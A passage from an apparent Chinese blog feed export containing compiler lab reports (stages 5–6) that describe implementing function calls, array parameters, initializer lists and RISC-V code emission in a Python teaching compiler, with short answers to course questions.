readCode<span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token builtin">input</span><span class="token punctuation">)</span>    r<span class="token punctuation">:</span> Program <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">,</span> lexer<span class="token operator">=</span>lexer<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>词法语法分析</strong>: 修改 <code>frontend/ast/tree.py</code>, 修改 <code>Parameter</code> 节点定义, 添加维度声明 <code>init_dim</code> 标识<strong>数组传参</strong>; 同时添加<strong>数组初始化列表</strong>节点 <code>InitList</code>.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/ast/tree.py</span><span class="token keyword">class</span> <span class="token class-name">InitList</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> init_list<span class="token punctuation">:</span> List<span class="token punctuation">[</span>IntLiteral<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"init_list"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>init_list <span class="token operator">=</span> init_list        self<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token punctuation">[</span>item<span class="token punctuation">.</span>value <span class="token keyword">for</span> item <span class="token keyword">in</span> init_list<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>frontend/parser/ply_parser.py</code> 中参考已有实现, 给出相关 <code>CFG</code> 文法.</p><p><strong>语义分析</strong>: 修改 <code>frontend/typecheck/namer.py</code>, 在 <code>visitFunction</code> 中记录函数声明中进行传参的<strong>参数数组</strong>; 在 <code>visitParameter</code> 中依据参数类型进行标识符 <code>symbol</code> 生成, 如果是数组则调用 <code>ArrayType.multidim</code> 生成相应的数据类型.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py</span><span class="token keyword">def</span> <span class="token function">visitParameter</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> param<span class="token punctuation">:</span> Parameter<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">#! 为数组参数, 检查并生成相应的数据类型</span>  <span class="token keyword">if</span> param<span class="token punctuation">.</span>init_dim<span class="token punctuation">:</span>        <span class="token keyword">for</span> index<span class="token punctuation">,</span> dim <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>param<span class="token punctuation">.</span>init_dim<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> dim <span class="token keyword">is</span> NULL<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> dim<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> DecafBadArraySizeError<span class="token punctuation">(</span><span class="token punctuation">)</span>        decl_type <span class="token operator">=</span> ArrayType<span class="token punctuation">.</span>multidim<span class="token punctuation">(</span>param<span class="token punctuation">.</span>var_t<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">[</span>dim<span class="token punctuation">.</span>value <span class="token keyword">if</span> dim <span class="token keyword">else</span> <span class="token boolean">None</span> <span class="token keyword">for</span> dim <span class="token keyword">in</span> param<span class="token punctuation">.</span>init_dim<span class="token punctuation">]</span><span class="token punctuation">)</span>        symbol <span class="token operator">=</span> VarSymbol<span class="token punctuation">(</span>param<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">,</span> decl_type<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>中间代码生成</strong>: 在 <code>utils/tac/tacgen.py</code> 中修改 <code>TACGen</code> 类的 <code>visitIdentifier</code> 方法, 对<strong>全局数组与局部数组</strong>直接加载数组地址, 对<strong>参数数组</strong>加载相应虚拟寄存器; 修改 <code>visitDeclaration</code> 方法, 若为<strong>带初始化列表</strong>的<strong>局部数组</strong>声明, 先调用 <code>fill_csx</code> 函数进行内存清零, 然后逐一进行元素初始化:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacgen.py</span><span class="token keyword">class</span> <span class="token class-name">TACGen</span><span class="token punctuation">(</span>Visitor<span class="token punctuation">[</span>TACFuncEmitter<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">visitIdentifier</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ident<span class="token punctuation">:</span> Identifier<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">,</span> ArrayType<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment"># 全局数组与局部数组</span>            <span class="token keyword">if</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isGlobal <span class="token keyword">or</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> mv<span class="token punctuation">.</span>func<span class="token punctuation">.</span>p_arrays<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitLoadAddress<span class="token punctuation">(</span>ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">,</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 参数数组</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>                ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">,</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp<span class="token punctuation">)</span>                ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">,</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitDeclaration</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> decl<span class="token punctuation">:</span> Declaration<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>decl<span class="token punctuation">.</span>init_expr<span class="token punctuation">,</span> InitList<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#! 调用 `fill_csx` 函数进行初始化</span>            symbol <span class="token operator">=</span> decl<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span>            addr <span class="token operator">=</span> mv<span class="token punctuation">.</span>visitLoadAddress<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>            <span class="token comment">#! size 为 4 -&gt; int 字长</span>            size <span class="token operator">=</span> symbol<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">.</span>full_indexed<span class="token punctuation">.</span>size            interval <span class="token operator">=</span> mv<span class="token punctuation">.</span>visitLoad<span class="token punctuation">(</span>size<span class="token punctuation">)</span>            mv<span class="token punctuation">.</span>visitParam<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>            mv<span class="token punctuation">.</span>visitParam<span class="token punctuation">(</span>mv<span class="token punctuation">.</span>visitLoad<span class="token punctuation">(</span>symbol<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">.</span>size <span class="token operator">//</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>            mv<span class="token punctuation">.</span>visitCall<span class="token punctuation">(</span>FuncLabel<span class="token punctuation">(</span><span class="token string">"fill_csx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment">#! 依次将初始化列表中的值存入数组中</span>            <span class="token keyword">for</span> value <span class="token keyword">in</span> decl<span class="token punctuation">.</span>init_expr<span class="token punctuation">.</span>value<span class="token punctuation">:</span>                mv<span class="token punctuation">.</span>visitStoreByAddress<span class="token punctuation">(</span>mv<span class="token punctuation">.</span>visitLoad<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>                mv<span class="token punctuation">.</span>visitBinarySelf<span class="token punctuation">(</span>tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>ADD<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> interval<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>目标代码生成</strong>: 在 <code>backend/riscv/riscvasmemitter.py</code> 中, <code>RiscvAsmEmitter</code> 对象初始化时打印<strong>带初始化列表</strong>的<strong>全局数组</strong>至 <code>.data</code> 区.</p><p>由于传参和调用分离, 对于<strong>参数数组</strong>的使用与<strong>普通函数参数</strong>并无区别, 这一步沿用 <strong>step 9</strong> 的实现即可, 后端无需进行其他工作.</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="step-10-1"><a href="#step-10-1" class="headerlink" title="step 10"></a>step 10</h3><ol><li><p>写出 <code>la v0, a</code> 这一 RiscV 伪指令可能会被转换成的指令组合 (两种即可).</p><p> <strong>答:</strong> 查阅 <a href="https://cloud.tsinghua.edu.cn/f/396ace39c8d24411a28f/">The RISC-V Instruction Set Manual</a>.</p><ul><li><p>non-PIC 可能转换为:</p>  <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">auipc v0, delta[31:12] + delta[11]addi v0, v0, delta[11:0]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  其中 <code>delta</code> 为 <code>a</code> 相对 <code>PC</code> 的偏移量, 因为地址在编译时已知, 所以使用 <code>addi</code> 加载.</p></li><li><p>PIC 可能转换为:</p>  <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">auipc v0, delta[31:12] + delta[11]lw v0, v0, delta[11:0]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  其中 <code>delta</code> 为 <code>a</code> 在 GOT 中的地址相对 <code>PC</code> 的偏移量, 因为 GOT 中的地址可能在运行时进行重定位, 因此需要使用 <code>lw</code> 从内存中加载地址.</p></li><li><p>两种指令组合都存在 <code>+ delta[11]</code>, 这保证了在 <code>delta[11] = 1</code> 时, 低 12 位经过符号扩展, 最终也能够得到正确的结果.</p></li></ul></li></ol><h3 id="step-11-1"><a href="#step-11-1" class="headerlink" title="step 11"></a>step 11</h3><ol><li><p>C 语言规范规定, 允许局部变量是可变长度的数组 (VLA), 在我们的实验中为了简化, 选择不支持它. 请简要回答, 如果支持一维的可变长度的数组 (类似 <code>int n = 5; int a[n];</code>, 但不允许类似 <code>int n = ...; int m = ...; int a[n][m];</code>), 而且要求数组仍保存在栈上 (不允许用堆上动态内存申请), 应该在现有的实现基础上做出那些改动?</p><blockquote><p>提示: 不能再在进入函数时统一给局部变量分配内存, 离开时统一释放内存.</p></blockquote><p> <strong>答:</strong> 不能在进入函数时为 VLA 分配内存. 由于 VLA 的大小在编译期确定, 运行到声明 VLA 时, 将当前 <code>SP</code> 和 VLA 大小 <code>size</code> 保存到栈上 <code>-size(SP)</code> 处, 并移动 <code>SP</code>, 此时先前存储好的 <code>SP</code> 和 <code>size</code> 恰位于栈顶; 访问 VLA 的元素时, 计算偏移量 VLA 元素地址; 当 VLA 离开作用域时, 恢复 SP 即可.</p></li></ol><h3 id="step-12-1"><a href="#step-12-1" class="headerlink" title="step 12"></a>step 12</h3><ol><li><p>作为函数参数的数组类型第一维可以为空. 事实上, 在 C/C++ 中即使标明了第一维的大小, 类型检查依然会当作第一维是空的情况处理. 如何理解这一设计?</p><p> <strong>答:</strong> C/C++ 数组传参时, 数组名对应首元素地址; 函数无需为数组分配内存, 只需要通过首地址和偏移量即可访问到任意数组元素, 根据数组索引计算偏移量不会用到第一维的大小, 因此编译器会将数组参数的第一维视为空.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Principles of Compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理 实验5</title>
      <link href="/2023/12/13/bian-yi-yuan-li-lab-5/"/>
      <url>/2023/12/13/bian-yi-yuan-li-lab-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Stage-5-报告"><a href="#Stage-5-报告" class="headerlink" title="Stage 5 报告"></a>Stage 5 报告</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="step-9"><a href="#step-9" class="headerlink" title="step 9"></a>step 9</h3><p><strong>词法语法分析</strong>: 修改 <code>frontend/ast/tree.py</code>, 定义 <code>Call</code>, <code>Parameter</code>, <code>ParameterList</code>, <code>ExpressionList</code> 节点, 在 <code>frontend/parser/ply_parser.py</code> 中参考已有实现, 给出相关 <code>CFG</code> 文法.</p><p><strong>语义分析</strong>: 修改 <code>frontend/typecheck/namer.py</code>, 完成语义分析. <code>visitFunction</code> 中首先需要检查函数是否重复声明, 同时为了将函数参数与函数体置于同一个作用域, 需要修改 <code>func.body.accept</code>, 避免访问 <code>block</code> 而新开一个作用域:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py</span><span class="token keyword">def</span> <span class="token function">visitFunction</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">:</span> Function<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> GlobalScope<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span>func<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafDeclConflictError<span class="token punctuation">(</span>func<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    symbol <span class="token operator">=</span> FuncSymbol<span class="token punctuation">(</span>func<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">,</span> func<span class="token punctuation">.</span>ret_t<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">,</span> GlobalScope<span class="token punctuation">)</span>    <span class="token keyword">for</span> param <span class="token keyword">in</span> func<span class="token punctuation">.</span>params<span class="token punctuation">.</span>children<span class="token punctuation">:</span>        symbol<span class="token punctuation">.</span>addParaType<span class="token punctuation">(</span>param<span class="token punctuation">.</span>var_t<span class="token punctuation">)</span>    GlobalScope<span class="token punctuation">.</span>declare<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>    func<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">,</span> symbol<span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    func<span class="token punctuation">.</span>params<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    <span class="token keyword">for</span> child <span class="token keyword">in</span> func<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">:</span>        child<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>visitCall</code> 中首先需要检查函数名是否被同级作用域声明的变量覆盖, 然后检查调用参数是否符合数目:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py</span><span class="token keyword">def</span> <span class="token function">visitCall</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> call<span class="token punctuation">:</span> Call<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> ctx<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span>call<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">raise</span> DecafBadFuncCallError<span class="token punctuation">(</span>call<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    func <span class="token operator">=</span> GlobalScope<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span>call<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> func <span class="token keyword">or</span> <span class="token keyword">not</span> func<span class="token punctuation">.</span>isFunc<span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafUndefinedFuncError<span class="token punctuation">(</span>call<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token keyword">if</span> func<span class="token punctuation">.</span>parameterNum <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>call<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafBadFuncCallError<span class="token punctuation">(</span><span class="token punctuation">)</span>    call<span class="token punctuation">.</span>ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">,</span> func<span class="token punctuation">)</span>    <span class="token keyword">for</span> arg <span class="token keyword">in</span> call<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        arg<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>中间代码生成</strong>: 使用传参和调用分离模式, 在 <code>utils/tac/tacop.py</code> 中添加两类指令类型定义:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacop.py</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">InstrKind</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Function call.</span>    CALL <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Function parameter.</span>    PARAM <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>utils/tac/tacinstr.py</code> 中参照已有实现定义了 <code>Call</code> 与 <code>Param</code> 两种 TAC 指令类, 在 <code>utils/tac/tacgen.py</code> 中实现与之有关的 <code>Visitor</code> 模式方法:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacgen.py</span><span class="token keyword">class</span> <span class="token class-name">TACFuncEmitter</span><span class="token punctuation">(</span>TACVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">visitParam</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">:</span> Temp<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>func<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Param<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visitCall</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> label<span class="token punctuation">:</span> Label<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Temp<span class="token punctuation">:</span>        temp <span class="token operator">=</span> self<span class="token punctuation">.</span>freshTemp<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>func<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Call<span class="token punctuation">(</span>temp<span class="token punctuation">,</span> label<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> temp<span class="token keyword">class</span> <span class="token class-name">TACGen</span><span class="token punctuation">(</span>Visitor<span class="token punctuation">[</span>TACFuncEmitter<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">visitParameter</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> param<span class="token punctuation">:</span> Parameter<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>      <span class="token comment"># 分配虚拟寄存器</span>        param<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp <span class="token operator">=</span> mv<span class="token punctuation">.</span>freshTemp<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visitCall</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> call<span class="token punctuation">:</span> Call<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> arg <span class="token keyword">in</span> call<span class="token punctuation">.</span>args<span class="token punctuation">.</span>children<span class="token punctuation">:</span>            arg<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>        <span class="token keyword">for</span> arg <span class="token keyword">in</span> call<span class="token punctuation">.</span>args<span class="token punctuation">.</span>children<span class="token punctuation">:</span>            mv<span class="token punctuation">.</span>visitParam<span class="token punctuation">(</span>arg<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        call<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitCall<span class="token punctuation">(</span>FuncLabel<span class="token punctuation">(</span>call<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>目标代码生成</strong>: 在 <code>utils/riscv.py</code> 中定义了 <code>Call</code> 与 <code>Param</code> 类指令用于寄存器分配的标识, 同时仿照 <code>SPAdd</code> 指令实现了 <code>FPAdd</code> 指令用于保存和恢复栈帧.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/riscv.py</span><span class="token keyword">class</span> <span class="token class-name">Call</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target<span class="token punctuation">:</span> Label<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>InstrKind<span class="token punctuation">.</span>CALL<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>target <span class="token operator">=</span> target    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"call "</span> <span class="token operator">+</span> <span class="token builtin">super</span><span class="token punctuation">(</span>FuncLabel<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Param</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> src<span class="token punctuation">:</span> Temp<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>InstrKind<span class="token punctuation">.</span>PARAM<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>src<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>backend/subroutineemitter.py</code> 实现了 <code>emitReg</code>,  <code>emitStoreParamToStack</code>, <code>emitRestoreStackPointer</code> 等方法用于保存参数到寄存器, 保存参数到栈中以及恢复栈指针.</p><p>在 <code>backend/riscv/riscvasmemitter.py</code> 中修改 <code>emitEnd</code> 打印 Riscv 指令的逻辑, 进入函数时将 <code>fp</code>, <code>ra</code> 寄存器存储到栈上, 保存 <code>callee_saved</code> 寄存器; 函数结束时, 从栈上恢复 <code>fp</code>, <code>ra</code> 寄存器和 <code>callee_saved</code> 寄存器:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/riscv/riscvasmemitter.py</span><span class="token keyword">def</span> <span class="token function">emitEnd</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment"># store RA, FP and CalleeSaved regs here</span>    self<span class="token punctuation">.</span>printer<span class="token punctuation">.</span>printInstr<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>SPAdd<span class="token punctuation">(</span><span class="token operator">-</span>self<span class="token punctuation">.</span>nextLocalOffset<span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>printer<span 